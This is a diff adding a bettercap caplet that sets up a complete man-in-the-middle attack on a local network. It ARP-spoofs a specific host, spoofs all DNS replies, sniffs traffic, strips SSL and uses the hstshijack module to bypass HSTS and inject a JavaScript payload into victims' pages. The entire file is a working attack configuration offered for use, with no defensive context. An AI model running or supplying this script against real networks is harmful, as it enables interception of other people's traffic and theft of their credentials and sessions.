@@ -1,0 +1,18 @@
+set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.ignore          *
+set hstshijack.targets         example.com,*.example.com
+set hstshijack.replacements    example.com,*.example.com
+set hstshijack.payload         /usr/local/share/bettercap/caplets/hstshijack/payloads/hstshijack-payload.js
+
+set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set net.sniff.verbose  false
+set dns.spoof.all      true
+net.sniff    on
+net.probe on
+dns.spoof    on
+set http.proxy.sslstrip true
+http.proxy   on
+set arp.spoof.targets 192.168.43.85
+arp.spoof on
+
+# set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js
